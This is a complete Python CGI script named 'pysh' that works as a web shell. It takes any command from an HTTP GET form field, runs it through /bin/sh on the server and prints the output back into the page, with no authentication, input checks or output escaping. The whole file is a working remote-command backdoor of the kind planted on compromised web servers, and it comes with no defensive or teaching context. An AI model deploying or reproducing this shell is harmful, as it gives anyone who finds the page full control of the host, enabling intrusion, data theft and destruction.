#!/usr/bin/env python

import cgi, shlex, subprocess
import cgitb; cgitb.enable()  # for troubleshooting
import os
from os import chdir
from subprocess import Popen, PIPE, STDOUT

print "Content-type: text/html"
print

print """
<html>

<head><title>pysh</title></head>

<body>
"""

form = cgi.FieldStorage()
command = form.getvalue("command", "")
cwd = form.getvalue("cwd", ".")

if command and shlex.split(command)[0]=="cd":
   cwd = shlex.split(command)[1]
   
os.chdir(cwd)
p = Popen(['/bin/sh'], stdout=PIPE, stdin=PIPE, stderr=STDOUT)
  
  
    
print """
  <div><pre>$ %s</pre></div>
  <div> 
    <form method="get">
      <p> <input type="hidden" name="cwd" value="%s"/> %s $ <input type="text" name="command" />
         <input type="submit" name="enter" />
       </p>
    </form>
  </div>

</body>

</html>
""" % (p.communicate(command)[0] , cwd, cwd)